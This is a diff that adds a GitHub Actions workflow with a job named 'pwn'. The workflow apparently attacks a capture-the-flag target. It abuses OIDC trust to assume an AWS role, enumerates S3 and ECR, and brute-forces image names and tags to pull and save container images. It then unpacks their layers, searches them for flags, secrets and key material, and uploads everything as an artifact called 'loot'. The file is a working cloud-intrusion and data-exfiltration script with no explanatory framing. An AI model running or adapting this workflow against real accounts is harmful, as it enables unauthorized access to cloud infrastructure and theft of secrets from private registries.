@@ -1,0 +1,71 @@
+name: assume-aws-and-dump
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Configure AWS creds via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
+          aws-region: ap-east-1
+
+      - name: Whoami
+        run: aws sts get-caller-identity
+
+      - name: Recon AWS
+        run: |
+          set -eux
+          aws s3 ls || true
+          aws ecr describe-repositories || true
+
+      - name: Try ECR pull
+        run: |
+          set -eux
+          aws ecr describe-repositories --query 'repositories[].repositoryUri' --output text || true
+          aws ecr get-login-password | docker login --username AWS --password-stdin 396961015104.dkr.ecr.ap-east-1.amazonaws.com
+          for repo in imaginary-challenge challenge image repo; do
+            for tag in latest main prod; do
+              docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$repo:$tag && \
+              docker save 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$repo:$tag -o image.tar && break 2
+            done
+          done
+
+      - name: Dump filesystem from image (if pulled)
+        if: always()
+        run: |
+          set -eux
+          if [ -f image.tar ]; then
+            mkdir img && tar -xf image.tar -C img
+            find img -type f -name 'layer.tar' -exec sh -c '
+              for f in "$@"; do
+                d=$(mktemp -d)
+                tar -xf "$f" -C "$d"
+                echo "[+] Searching $f"
+                rg -n --hidden --no-messages -i "flag|secret|aes|gcm|pbkdf2|rockyou|base64|aad|REDACTED" "$d" || true
+                tar -czf "$f.files.tgz" -C "$d" .
+              done
+            ' sh {} +
+          fi
+
+      - name: Upload artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: loot
+          path: |
+            img/**/*
+            **/*.files.tgz
+            image.tar
+          if-no-files-found: ignore
